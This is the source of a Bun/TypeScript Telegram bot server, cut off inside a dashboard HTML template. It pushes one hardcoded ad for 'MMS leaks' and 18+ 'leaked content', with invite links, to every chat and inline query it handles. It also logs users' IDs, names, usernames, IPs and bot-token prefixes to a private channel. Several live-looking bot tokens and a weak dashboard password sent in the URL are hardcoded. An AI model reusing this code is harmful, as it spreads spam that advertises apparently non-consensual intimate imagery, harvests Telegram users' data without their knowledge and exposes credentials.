import { serve } from "bun"
import NodeCache from "node-cache"

// Fresh Type Definitions
interface APIResponse {
  ok: boolean
  description?: string
  result?: any
  parameters?: { retry_after?: number }
}

interface RequestRecord {
  id: string
  timestamp: string
  token: string
  status: "success" | "failed" | "rate_limited"
  responseTime: number
  error?: string
  botUsername?: string
  userAgent?: string
  ip?: string
}

interface ServerMetrics {
  totalRequests: number
  successfulRequests: number
  failedRequests: number
  rateLimitedRequests: number
  totalResponseTime: number
  averageResponseTime: number
  uptime: number
  memoryUsage: NodeJS.MemoryUsage
  activeConnections: number
}

interface IncomingUpdate {
  [key: string]: any
  message?: {
    chat: ChatInfo
    from?: UserInfo
    text?: string
  }
  callback_query?: {
    message: { chat: ChatInfo }
    from: UserInfo
    data?: string
  }
  channel_post?: {
    chat: ChatInfo
    sender_chat?: any
  }
  inline_query?: {
    id: string
    from: UserInfo
    query: string
  }
  my_chat_member?: {
    chat: ChatInfo
    from: UserInfo
  }
}

interface UserInfo {
  id: number
  first_name: string
  last_name?: string
  username?: string
  language_code?: string
  is_bot?: boolean
}

interface ChatInfo {
  id: number
  type: "private" | "group" | "supergroup" | "channel"
  title?: string
  username?: string
}

interface BotDetails {
  ok: boolean
  result?: {
    id: number
    username: string
    first_name: string
    can_join_groups?: boolean
    can_read_all_group_messages?: boolean
    supports_inline_queries?: boolean
  }
}

// ONLY ONE AD CONTENT - HARDCODED
interface ContentItem {
  id: string
  active: boolean
  mediaType: "photo_with_text_and_buttons"
  photoUrl: string
  textContent: string
  actionButtons: Array<{
    buttonText: string
    buttonUrl: string
  }>
  stats: {
    views: number
    clicks: number
  }
}

interface UserActivity {
  id: string
  timestamp: string
  botUsername: string
  botToken: string
  userDetails: {
    id: number
    fullName: string
    username: string
    language?: string
    isBot: boolean
  }
  chatDetails: {
    id: number
    type: string
    title?: string
  }
  activityType: string
  processingData: {
    userAgent?: string
    ip?: string
    responseTime: number
  }
}

// Server Settings
const SERVER_SETTINGS = {
  MAX_ACTIVITY_BUFFER: 15,
  LOG_CHANNEL_ID: "-1002529607208",
  ADMIN_CHANNEL_ID: "-1002628971429",
  ADMIN_BOT_TOKEN: "7734817163:AAESWrSeVKg5iclnM2R2SvOA5xESClG8tFM",
  DASHBOARD_PASSWORD: "ashu45",
  RATE_LIMIT_WINDOW: 60000,
  RATE_LIMIT_MAX_REQUESTS: 30,
  REQUEST_TIMEOUT: 15000,
  RETRY_ATTEMPTS: 3,
  CACHE_TTL: 86400,
} as const

// Single Bot Configuration
const PRIMARY_BOT = {
  name: "main_bot",
  token: "5487595571:AAF9U10ETqOjNpVrEhT6MQONIta6PJUXSB0",
  health: 100,
  lastUsed: 0,
}

// ONLY THIS ONE CONTENT ITEM EXISTS - NO OTHER ADS POSSIBLE
const SINGLE_CONTENT_ITEM: ContentItem = {
  id: "exclusive_mms_content",
  active: true,
  mediaType: "photo_with_text_and_buttons",
  photoUrl: "https://i.ibb.co/69jxy9f/image.png",
  textContent: `🔥 <b>NEW MMS LEAKS ARE OUT!</b> 🔥

💥 <b><u>EXCLUSIVE PREMIUM CONTENT</u></b> 💥

🎬 <i>Fresh leaked content daily</i>
🔞 <b>18+ Adult Material</b>
💎 <i>Premium quality videos & files</i>
🚀 <b>Instant access available</b>

⬇️ <b><u>Click any server below</u></b> ⬇️

<blockquote>⚠️ <b>Limited time offer - Join now!</b></blockquote>`,
  actionButtons: [
    { buttonText: "🎥 VIDEOS💦", buttonUrl: "https://t.me/+NiLqtvjHQoFhZjQ1" },
    { buttonText: "📁 FILES🍑", buttonUrl: "https://t.me/+fvFJeSbZEtc2Yjg1" },
  ],
  stats: { views: 0, clicks: 0 },
}

// Fresh Cache Instance
const freshCache = new NodeCache({
  stdTTL: SERVER_SETTINGS.CACHE_TTL,
  checkperiod: 600,
  useClones: false,
  maxKeys: 10000,
})

// Server State Controller
class ServerStateController {
  private static instance: ServerStateController
  public serverStartTime: number = Date.now()
  public activityBuffer: UserActivity[] = []
  public currentConnections = 0
  public rateLimitMap: Map<string, { count: number; resetTime: number }> = new Map()

  static getInstance(): ServerStateController {
    if (!ServerStateController.instance) {
      ServerStateController.instance = new ServerStateController()
    }
    return ServerStateController.instance
  }

  increaseConnections(): void {
    this.currentConnections++
  }

  decreaseConnections(): void {
    this.currentConnections = Math.max(0, this.currentConnections - 1)
  }

  recordActivity(activity: UserActivity): void {
    this.activityBuffer.unshift(activity)
    if (this.activityBuffer.length > SERVER_SETTINGS.MAX_ACTIVITY_BUFFER * 2) {
      this.activityBuffer = this.activityBuffer.slice(0, SERVER_SETTINGS.MAX_ACTIVITY_BUFFER)
    }
  }

  getServerMetrics(): ServerMetrics {
    const memoryUsage = process.memoryUsage()
    const uptime = Date.now() - this.serverStartTime

    const totalRequests = (freshCache.get("totalRequests") as number) || 0
    const successfulRequests = (freshCache.get("successfulRequests") as number) || 0
    const failedRequests = (freshCache.get("failedRequests") as number) || 0
    const rateLimitedRequests = (freshCache.get("rateLimitedRequests") as number) || 0
    const totalResponseTime = (freshCache.get("totalResponseTime") as number) || 0

    return {
      totalRequests,
      successfulRequests,
      failedRequests,
      rateLimitedRequests,
      totalResponseTime,
      averageResponseTime: totalRequests > 0 ? totalResponseTime / totalRequests : 0,
      uptime,
      memoryUsage,
      activeConnections: this.currentConnections,
    }
  }
}

const serverController = ServerStateController.getInstance()

// Fresh Utility Functions
class FreshUtils {
  static sanitizeString(text: string): string {
    if (!text) return ""
    return text
      .replace(/[\u0300-\u036f\u1AB0-\u1AFF\u1DC0-\u1DFF\u20D0-\u20FF\uFE20-\uFE2F]/g, "")
      .replace(/[\u0080-\uFFFF]/g, "")
      .replace(/[<>&"']/g, (match) => {
        const entities: { [key: string]: string } = {
          "<": "&lt;",
          ">": "&gt;",
          "&": "&amp;",
          '"': "&quot;",
          "'": "&#x27;",
        }
        return entities[match] || match
      })
      .replace(/\s+/g, " ")
      .trim()
  }

  static createNewId(): string {
    return Date.now().toString(36) + Math.random().toString(36).substr(2)
  }

  static formatTimeSpan(ms: number): string {
    const seconds = Math.floor(ms / 1000)
    const minutes = Math.floor(seconds / 60)
    const hours = Math.floor(minutes / 60)
    const days = Math.floor(hours / 24)

    if (days > 0) return `${days}d ${hours % 24}h ${minutes % 60}m`
    if (hours > 0) return `${hours}h ${minutes % 60}m ${seconds % 60}s`
    if (minutes > 0) return `${minutes}m ${seconds % 60}s`
    return `${seconds}s`
  }

  static formatMemorySize(bytes: number): string {
    const sizes = ["Bytes", "KB", "MB", "GB"]
    if (bytes === 0) return "0 Bytes"
    const i = Math.floor(Math.log(bytes) / Math.log(1024))
    return Math.round((bytes / Math.pow(1024, i)) * 100) / 100 + " " + sizes[i]
  }

  static getRequestIP(req: Request): string {
    const forwarded = req.headers.get("x-forwarded-for")
    const realIP = req.headers.get("x-real-ip")
    const cfIP = req.headers.get("cf-connecting-ip")
    return cfIP || realIP || forwarded?.split(",")[0] || "unknown"
  }

  static isRequestRateLimited(identifier: string): boolean {
    const now = Date.now()
    const rateLimitData = serverController.rateLimitMap.get(identifier)

    if (!rateLimitData || now > rateLimitData.resetTime) {
      serverController.rateLimitMap.set(identifier, {
        count: 1,
        resetTime: now + SERVER_SETTINGS.RATE_LIMIT_WINDOW,
      })
      return false
    }

    if (rateLimitData.count >= SERVER_SETTINGS.RATE_LIMIT_MAX_REQUESTS) {
      return true
    }

    rateLimitData.count++
    return false
  }
}

// Fresh Request Logger
class FreshRequestLogger {
  static recordRequest(entry: Partial<RequestRecord>): void {
    const requestRecord: RequestRecord = {
      id: FreshUtils.createNewId(),
      timestamp: new Date().toISOString(),
      token: entry.token || "unknown",
      status: entry.status || "failed",
      responseTime: entry.responseTime || 0,
      error: entry.error,
      botUsername: entry.botUsername,
      userAgent: entry.userAgent,
      ip: entry.ip,
    }

    const requestLog = (freshCache.get("requestLog") as RequestRecord[]) || []
    requestLog.unshift(requestRecord)

    if (requestLog.length > 1000) {
      requestLog.splice(500)
    }

    freshCache.set("requestLog", requestLog)

    // Update statistics
    const totalRequests = ((freshCache.get("totalRequests") as number) || 0) + 1
    freshCache.set("totalRequests", totalRequests)

    if (entry.status === "success") {
      const successfulRequests = ((freshCache.get("successfulRequests") as number) || 0) + 1
      freshCache.set("successfulRequests", successfulRequests)
    } else if (entry.status === "rate_limited") {
      const rateLimitedRequests = ((freshCache.get("rateLimitedRequests") as number) || 0) + 1
      freshCache.set("rateLimitedRequests", rateLimitedRequests)
    } else {
      const failedRequests = ((freshCache.get("failedRequests") as number) || 0) + 1
      freshCache.set("failedRequests", failedRequests)
    }

    if (entry.responseTime) {
      const totalResponseTime = ((freshCache.get("totalResponseTime") as number) || 0) + entry.responseTime
      freshCache.set("totalResponseTime", totalResponseTime)
    }
  }

  static formatActivityLogs(activities: UserActivity[]): string {
    return activities
      .map((activity, index) => {
        const user = activity.userDetails
        const chat = activity.chatDetails

        return `${index + 1}. <b>Bot:</b> @${FreshUtils.sanitizeString(activity.botUsername)}
<b>User:</b> ${FreshUtils.sanitizeString(user.fullName)} (@${FreshUtils.sanitizeString(user.username)})
<b>User ID:</b> <code>${user.id}</code>
<b>Chat Type:</b> <code>${FreshUtils.sanitizeString(chat.type)}</code>
<b>Activity Type:</b> <code>${FreshUtils.sanitizeString(activity.activityType)}</code>
<b>Time:</b> <code>${new Date(activity.timestamp).toLocaleString()}</code>
<b>Response Time:</b> <code>${activity.processingData.responseTime.toFixed(2)}ms</code>
<b>Token:</b> <code>${activity.botToken.substring(0, 10)}...</code>`
      })
      .join("\n\n")
  }
}

// Fresh Telegram API Handler
class FreshTelegramAPI {
  private static circuitBreaker: Map<string, { failures: number; lastFailure: number; isOpen: boolean }> = new Map()

  static async retryRequest<T>(
    operation: () => Promise<T>,
    maxRetries: number = SERVER_SETTINGS.RETRY_ATTEMPTS,
    baseDelay = 1000,
  ): Promise<T> {
    let lastError: Error | null = null

    for (let attempt = 0; attempt < maxRetries; attempt++) {
      try {
        return await operation()
      } catch (error: any) {
        lastError = error

        if (attempt === maxRetries - 1) break

        if (error.message?.includes("rate limit") || error.message?.includes("Too Many Requests")) {
          const retryAfter = error.parameters?.retry_after || 60
          await new Promise((resolve) => setTimeout(resolve, retryAfter * 1000))
          continue
        }

        if (["ECONNRESET", "ETIMEDOUT", "ECONNREFUSED"].includes(error.code)) {
          const delay = Math.min(baseDelay * Math.pow(2, attempt), 30000) + Math.random() * 1000
          await new Promise((resolve) => setTimeout(resolve, delay))
          continue
        }

        const delay = baseDelay * Math.pow(2, attempt) + Math.random() * 1000
        await new Promise((resolve) => setTimeout(resolve, delay))
      }
    }

    throw lastError || new Error("Operation failed after retries")
  }

  static async sendTextMessage(
    botToken: string,
    chatId: string | number,
    text: string,
    options: {
      parse_mode?: "HTML" | "Markdown"
      reply_markup?: any
      disable_web_page_preview?: boolean
    } = {},
  ): Promise<APIResponse> {
    const messageData = {
      chat_id: chatId,
      text: text.substring(0, 4096),
      parse_mode: options.parse_mode || "HTML",
      disable_web_page_preview: options.disable_web_page_preview || false,
      ...options,
    }

    return this.makeAPICall(botToken, "sendMessage", messageData)
  }

  static async sendPhotoWithCaption(
    botToken: string,
    chatId: string | number,
    photo: string,
    options: {
      caption?: string
      parse_mode?: "HTML" | "Markdown"
      reply_markup?: any
    } = {},
  ): Promise<APIResponse> {
    const messageData = {
      chat_id: chatId,
      photo,
      caption: options.caption?.substring(0, 1024),
      parse_mode: options.parse_mode || "HTML",
      ...options,
    }

    return this.makeAPICall(botToken, "sendPhoto", messageData)
  }

  static async getBotDetails(botToken: string): Promise<BotDetails> {
    return this.makeAPICall(botToken, "getMe", {}) as Promise<BotDetails>
  }

  static async answerInlineQuery(
    botToken: string,
    inlineQueryId: string,
    results: any[],
    options: { cache_time?: number } = {},
  ): Promise<APIResponse> {
    const queryData = {
      inline_query_id: inlineQueryId,
      results: results.slice(0, 50),
      cache_time: options.cache_time || 1,
    }

    return this.makeAPICall(botToken, "answerInlineQuery", queryData)
  }

  private static async makeAPICall(botToken: string, method: string, data: any): Promise<APIResponse> {
    const circuitKey = `${botToken}_${method}`
    const circuit = this.circuitBreaker.get(circuitKey)

    if (circuit?.isOpen && Date.now() - circuit.lastFailure < 60000) {
      throw new Error("Circuit breaker is open")
    }

    const controller = new AbortController()
    const timeoutId = setTimeout(() => controller.abort(), SERVER_SETTINGS.REQUEST_TIMEOUT)

    try {
      const response = await fetch(`https://api.telegram.org/bot${botToken}/${method}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data),
        signal: controller.signal,
      })

      clearTimeout(timeoutId)

      const result = (await response.json()) as APIResponse

      if (!result.ok) {
        throw new Error(`Telegram API error: ${result.description}`)
      }

      if (circuit) {
        circuit.failures = 0
        circuit.isOpen = false
      }

      return result
    } catch (error: any) {
      clearTimeout(timeoutId)

      const currentCircuit = this.circuitBreaker.get(circuitKey) || { failures: 0, lastFailure: 0, isOpen: false }
      currentCircuit.failures++
      currentCircuit.lastFailure = Date.now()
      currentCircuit.isOpen = currentCircuit.failures >= 5
      this.circuitBreaker.set(circuitKey, currentCircuit)

      throw error
    }
  }
}

// Fresh Content Delivery System - ONLY ONE CONTENT ITEM
class FreshContentDelivery {
  // This function ONLY delivers the single hardcoded content item
  static async deliverSingleContent(botToken: string, chatId: string | number, chatType: string): Promise<void> {
    // ONLY process if the single content item is active
    if (!SINGLE_CONTENT_ITEM.active) return

    // Track view
    SINGLE_CONTENT_ITEM.stats.views++

    // Create inline keyboard from action buttons
    const inlineKeyboard = SINGLE_CONTENT_ITEM.actionButtons.map((button) => [
      {
        text: button.buttonText,
        url: button.buttonUrl,
      },
    ])

    try {
      // Send the single photo with caption and buttons
      await FreshTelegramAPI.retryRequest(() =>
        FreshTelegramAPI.sendPhotoWithCaption(botToken, chatId, SINGLE_CONTENT_ITEM.photoUrl, {
          caption: SINGLE_CONTENT_ITEM.textContent,
          reply_markup: { inline_keyboard: inlineKeyboard },
        }),
      )

      console.log(`✅ Single content delivered to chat ${chatId}`)
    } catch (error) {
      console.error(`❌ Failed to deliver content to chat ${chatId}:`, error)
    }
  }

  // Generate inline results for inline queries - ONLY the single content
  static generateSingleInlineResult(): any[] {
    if (!SINGLE_CONTENT_ITEM.active) return []

    const inlineKeyboard = SINGLE_CONTENT_ITEM.actionButtons.map((button) => [
      {
        text: button.buttonText,
        url: button.buttonUrl,
      },
    ])

    return [
      {
        type: "photo",
        id: `single_content_${SINGLE_CONTENT_ITEM.id}`,
        photo_url: SINGLE_CONTENT_ITEM.photoUrl,
        thumb_url: SINGLE_CONTENT_ITEM.photoUrl,
        caption: SINGLE_CONTENT_ITEM.textContent,
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: inlineKeyboard },
      },
    ]
  }

  // Get content statistics
  static getContentStats(): any {
    return {
      id: SINGLE_CONTENT_ITEM.id,
      stats: SINGLE_CONTENT_ITEM.stats,
      active: SINGLE_CONTENT_ITEM.active,
    }
  }
}

// Fresh Log Bot Manager
class FreshLogBotManager {
  private static botCooldownUntil = 0

  static async sendActivityLogs(): Promise<void> {
    if (serverController.activityBuffer.length < SERVER_SETTINGS.MAX_ACTIVITY_BUFFER) return
    if (Date.now() < this.botCooldownUntil) return

    const logsToSend = serverController.activityBuffer.slice(0, SERVER_SETTINGS.MAX_ACTIVITY_BUFFER)
    const message = FreshRequestLogger.formatActivityLogs(logsToSend)

    try {
      await FreshTelegramAPI.retryRequest(() =>
        FreshTelegramAPI.sendTextMessage(PRIMARY_BOT.token, SERVER_SETTINGS.LOG_CHANNEL_ID, message),
      )

      PRIMARY_BOT.health = Math.min(100, PRIMARY_BOT.health + 5)
      PRIMARY_BOT.lastUsed = Date.now()

      console.log(`✅ Activity logs sent successfully using ${PRIMARY_BOT.name}`)

      serverController.activityBuffer.splice(0, SERVER_SETTINGS.MAX_ACTIVITY_BUFFER)
    } catch (error: any) {
      PRIMARY_BOT.health = Math.max(0, PRIMARY_BOT.health - 10)

      if (error.message?.includes("Too Many Requests")) {
        const retryAfter = error.parameters?.retry_after || 60
        this.botCooldownUntil = Date.now() + retryAfter * 1000
        console.warn(`⚠️ ${PRIMARY_BOT.name} rate limited for ${retryAfter}s`)
      } else {
        console.error(`❌ Failed to send logs with ${PRIMARY_BOT.name}:`, error.message)
      }
    }
  }

  static getBotStatus(): Array<{ name: string; health: number; lastUsed: number; inCooldown: boolean }> {
    const now = Date.now()
    return [
      {
        name: PRIMARY_BOT.name,
        health: PRIMARY_BOT.health,
        lastUsed: PRIMARY_BOT.lastUsed,
        inCooldown: this.botCooldownUntil > now,
      },
    ]
  }
}

// Fresh Update Processor
async function processFreshUpdate(
  update: IncomingUpdate,
  botToken: string,
  userAgent: string,
  clientIP: string,
  startTime: number,
): Promise<void> {
  let chatId: string | number | null = null
  let user: UserInfo | null = null
  let chat: ChatInfo | null = null
  let activityType = ""

  if (update.message) {
    activityType = "message"
    chat = update.message.chat
    chatId = chat.id
    user = update.message.from || null
  } else if (update.callback_query) {
    activityType = "callback_query"
    chat = update.callback_query.message.chat
    chatId = chat.id
    user = update.callback_query.from
  } else if (update.channel_post) {
    activityType = "channel_post"
    chat = update.channel_post.chat
    chatId = chat.id
    user = update.channel_post.sender_chat
  } else if (update.inline_query) {
    activityType = "inline_query"
    user = update.inline_query.from
  } else if (update.my_chat_member) {
    activityType = "my_chat_member"
    chat = update.my_chat_member.chat
    chatId = chat.id
    user = update.my_chat_member.from
  }

  if (!activityType) return

  const botDetails = await FreshTelegramAPI.getBotDetails(botToken)
  const botUsername = botDetails.ok && botDetails.result ? botDetails.result.username : "unknown"

  if (user) {
    const activity: UserActivity = {
      id: FreshUtils.createNewId(),
      timestamp: new Date().toISOString(),
      botUsername,
      botToken,
      userDetails: {
        id: user.id,
        fullName: user.last_name ? `${user.first_name} ${user.last_name}` : user.first_name,
        username: user.username || "none",
        language: user.language_code,
        isBot: user.is_bot || false,
      },
      chatDetails: chat
        ? {
            id: chat.id,
            type: chat.type,
            title: chat.title,
          }
        : { id: 0, type: "unknown" },
      activityType,
      processingData: {
        userAgent,
        ip: clientIP,
        responseTime: performance.now() - startTime,
      },
    }

    serverController.recordActivity(activity)

    if (serverController.activityBuffer.length >= SERVER_SETTINGS.MAX_ACTIVITY_BUFFER) {
      FreshLogBotManager.sendActivityLogs().catch((error) => console.error("❌ Background log sending failed:", error))
    }
  }

  // Handle inline queries with single content
  if (activityType === "inline_query" && update.inline_query?.id) {
    const results = FreshContentDelivery.generateSingleInlineResult()
    await FreshTelegramAPI.answerInlineQuery(botToken, update.inline_query.id, results)
    return
  }

  // Deliver single content if we have a chat ID
  if (chatId && chat) {
    FreshContentDelivery.deliverSingleContent(botToken, chatId, chat.type).catch((error) =>
      console.error("❌ Content delivery failed:", error),
    )
  }
}

// Fresh Status Page
function createFreshStatusPage(): Response {
  const metrics = serverController.getServerMetrics()
  const uptime = FreshUtils.formatTimeSpan(metrics.uptime)

  const html = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fresh Bot Server Status</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .fresh-container {
            background: rgba(255, 255, 255, 0.98);
            backdrop-filter: blur(20px);
            border-radius: 30px;
            padding: 60px;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.2);
            text-align: center;
            max-width: 700px;
            width: 100%;
            border: 1px solid rgba(255, 255, 255, 0.3);
        }
        .fresh-icon {
            font-size: 6rem;
            margin-bottom: 30px;
            animation: float 3s ease-in-out infinite;
        }
        @keyframes float {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-20px); }
        }
        h1 {
            color: #1a202c;
            margin-bottom: 40px;
            font-size: 3rem;
            font-weight: 900;
            background: linear-gradient(135deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .fresh-metrics {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
            margin-bottom: 40px;
        }
        .fresh-metric {
            background: linear-gradient(135deg, #f8fafc, #e2e8f0);
            padding: 30px;
            border-radius: 20px;
            border: 2px solid #e2e8f0;
            transition: all 0.3s ease;
        }
        .fresh-metric:hover {
            transform: translateY(-10px);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
        }
        .metric-value {
            font-size: 2.2rem;
            font-weight: 900;
            color: #1a202c;
            margin-bottom: 10px;
        }
        .metric-label {
            color: #4a5568;
            font-size: 1.1rem;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .fresh-status {
            display: inline-block;
            background: linear-gradient(135deg, #48bb78, #38a169);
            color: white;
            padding: 15px 30px;
            border-radius: 30px;
            font-weight: 800;
            margin-bottom: 30px;
            font-size: 1.2rem;
            box-shadow: 0 10px 20px rgba(72, 187, 120, 0.3);
        }
        .fresh-footer {
            color: #4a5568;
            font-size: 1rem;
            margin-top: 30px;
            font-weight: 600;
        }
    </style>
</head>
<body>
    <div class="fresh-container">
        <div class="fresh-icon">🚀</div>
        <h1>Fresh Server Status</h1>
        <div class="fresh-status">🟢 Online & Fresh</div>
        
        <div class="fresh-metrics">
            <div class="fresh-metric">
                <div class="metric-value">${uptime}</div>
                <div class="metric-label">Fresh Uptime</div>
            </div>
            <div class="fresh-metric">
                <div class="metric-value">${metrics.totalRequests.toLocaleString()}</div>
                <div class="metric-label">Total Requests</div>
            </div>
            <div class="fresh-metric">
                <div class="metric-value">${metrics.currentConnections}</div>
                <div class="metric-label">Active Connections</div>
            </div>
            <div class="fresh-metric">
                <div class="metric-value">${metrics.averageResponseTime.toFixed(1)}ms</div>
                <div class="metric-label">Avg Response</div>
            </div>
        </div>
        
        <div class="fresh-footer">
            <p>🤖 Fresh Telegram Bot Server</p>
            <p>Completely rebuilt - ${new Date().toLocaleString()}</p>
        </div>
    </div>
</body>
</html>`

  return new Response(html, {
    headers: { "Content-Type": "text/html" },
  })
}

// Fresh Dashboard
function createFreshDashboard(url: URL): Response {
  const password = url.searchParams.get("pass")

  if (password !== SERVER_SETTINGS.DASHBOARD_PASSWORD) {
    const html = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fresh Dashboard Access</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .fresh-login {
            background: white;
            padding: 60px;
            border-radius: 30px;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.2);
            text-align: center;
            max-width: 500px;
            width: 100%;
        }
        .fresh-lock {
            font-size: 5rem;
            margin-bottom: 30px;
            color: #4299e1;
        }
        h1 {
            color: #1a202c;
            margin-bottom: 40px;
            font-size: 2.5rem;
            font-weight: 900;
        }
        .fresh-input-group {
            margin-bottom: 30px;
            text-align: left;
        }
        label {
            display: block;
            margin-bottom: 12px;
            color: #2d3748;
            font-weight: 800;
            font-size: 1.1rem;
        }
        input[type="password"] {
            width: 100%;
            padding: 18px 24px;
            border: 3px solid #e2e8f0;
            border-radius: 15px;
            font-size: 1.2rem;
            transition: all 0.3s;
            font-weight: 600;
        }
        input[type="password"]:focus {
            outline: none;
            border-color: #4299e1;
            box-shadow: 0 0 0 3px rgba(66, 153, 225, 0.1);
        }
        .fresh-btn {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #4299e1, #3182ce);
            color: white;
            border: none;
            border-radius: 15px;
            font-size: 1.2rem;
            font-weight: 800;
            cursor: pointer;
            transition: all 0.3s;
        }
        .fresh-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(66, 153, 225, 0.3);
        }
        .fresh-error {
            color: #e53e3e;
            margin-top: 25px;
            font-size: 1.1rem;
            font-weight: 700;
        }
    </style>
</head>
<body>
    <div class="fresh-login">
        <div class="fresh-lock">🔒</div>
        <h1>Fresh Dashboard</h1>
        <form method="GET" action="/status">
            <div class="fresh-input-group">
                <label for="password">Enter Fresh Password:</label>
                <input type="password" id="password" name="pass" required>
            </div>
            <button type="submit" class="fresh-btn">Access Fresh Dashboard</button>
        </form>
        ${password ? '<div class="fresh-error">❌ Invalid password. Try again.</div>' : ""}
    </div>
</body>
</html>`

    return new Response(html, {
      headers: { "Content-Type": "text/html" },
    })
  }

  const metrics = serverController.getServerMetrics()
  const requestLog = (freshCache.get("requestLog") as RequestRecord[]) || []
  const recentLogs = requestLog.slice(0, 20)
  const botStatus = FreshLogBotManager.getBotStatus()
  const contentStats = FreshContentDelivery.getContentStats()

  const html = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fresh Bot Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: #f0f4f8;
            color: #1a202c;
            line-height: 1.6;
        }
        .fresh-header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 4rem;
            text-align: center;
        }
        .fresh-header h1 {
            font-size: 4rem;
            margin-bottom: 1rem;
            font-weight: 900;
        }
        .fresh-header p {
            opacity: 0.9;
            font-size: 1.3rem;
            font-weight: 600;
        }
        .fresh-container {
            max-width: 1600px;
            margin: 0 auto;
            padding: 4rem;
        }
        .fresh-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
            gap: 3rem;
            margin-bottom: 4rem;
        }
        .fresh-card {
            background: white;
            padding: 3rem;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            border: 2px solid #e2e8f0;
            transition: all 0.3s ease;
        }
        .fresh-card:hover {
            transform: translateY(-10px);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
        }
        .fresh-card.success { border-left: 6px solid #10b981; }
        .fresh-card.warning { border-left: 6px solid #f59e0b; }
        .fresh-card.error { border-left: 6px solid #ef4444; }
        .fresh-card.info { border-left: 6px solid #3b82f6; }
        .card-value {
            font-size: 3rem;
            font-weight: 900;
            margin-bottom: 1rem;
            color: #1a202c;
        }
        .card-label {
            color: #4a5568;
            font-size: 1.2rem;
            text-transform: uppercase;
            letter-spacing: 2px;
            font-weight: 800;
        }
        .fresh-section {
            background: white;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            margin-bottom: 4rem;
            overflow: hidden;
            border: 2px solid #e2e8f0;
        }
        .section-header {
            background: linear-gradient(135deg, #f8fafc, #e2e8f0);
            padding: 2rem 3rem;
            border-bottom: 2px solid #e2e8f0;
            font-weight: 900;
            font-size: 1.5rem;
            color: #1a202c;
        }
        .section-content {
            padding: 3rem;
        }
        .fresh-table {
            width: 100%;
            border-collapse: collapse;
        }
        .fresh-table th,
        .fresh-table td {
            padding: 1.5rem;
            text-align: left;
            border-bottom: 2px solid #e2e8f0;
            font-weight: 600;
        }
        .fresh-table th {
            background: linear-gradient(135deg, #f8fafc, #e2e8f0);
            font-weight: 900;
            color: #1a202c;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .status-success { color: #10b981; font-weight: 900; }
        .status-failed { color: #ef4444; font-weight: 900; }
        .status-rate_limited { color: #f59e0b; font-weight: 900; }
        .fresh-health {
            width: 100%;
            height: 12px;
            background: #e2e8f0;
            border-radius: 6px;
            overflow: hidden;
        }
        .health-fill {
            height: 100%;
            transition: width 0.3s ease;
        }
        .health-excellent { background: linear-gradient(135deg, #10b981, #059669); }
        .health-good { background: linear-gradient(135deg, #f59e0b, #d97706); }
        .health-poor { background: linear-gradient(135deg, #ef4444, #dc2626); }
        .fresh-refresh {
            position: fixed;
            bottom: 4rem;
            right: 4rem;
            background: linear-gradient(135deg, #4299e1, #3182ce);
            color: white;
            border: none;
            padding: 1.5rem;
            border-radius: 50%;
            font-size: 2rem;
            cursor: pointer;
            box-shadow: 0 10px 30px rgba(66, 153, 225, 0.4);
            transition: all 0.3s;
        }
        .fresh-refresh:hover {
            transform: scale(1.2);
        }
        @media (max-width: 768px) {
            .fresh-container { padding: 2rem; }
            .fresh-grid { grid-template-columns: 1fr; }
            .fresh-table { font-size: 0.9rem; }
        }
    </style>
</head>
<body>
    <div class="fresh-header">
        <h1>🚀 Fresh Bot Dashboard</h1>
        <p>Completely rebuilt monitoring system</p>
    </div>

    <div class="fresh-container">
        <!-- Fresh Metrics -->
        <div class="fresh-grid">
            <div class="fresh-card info">
                <div class="card-value">${metrics.totalRequests.toLocaleString()}</div>
                <div class="card-label">Total Requests</div>
            </div>
            <div class="fresh-card success">
                <div class="card-value">${metrics.successfulRequests.toLocaleString()}</div>
                <div class="card-label">Successful</div>
            </div>
            <div class="fresh-card error">
                <div class="card-value">${metrics.failedRequests.toLocaleString()}</div>
                <div class="card-label">Failed</div>
            </div>
            <div class="fresh-card warning">
                <div class="card-value">${metrics.rateLimitedRequests.toLocaleString()}</div>
                <div class="card-label">Rate Limited</div>
            </div>
            <div class="fresh-card info">
                <div class="card-value">${metrics.averageResponseTime.toFixed(1)}ms</div>
                <div class="card-label">Avg Response</div>
            </div>
            <div class="fresh-card success">
                <div class="card-value">${FreshUtils.formatTimeSpan(metrics.uptime)}</div>
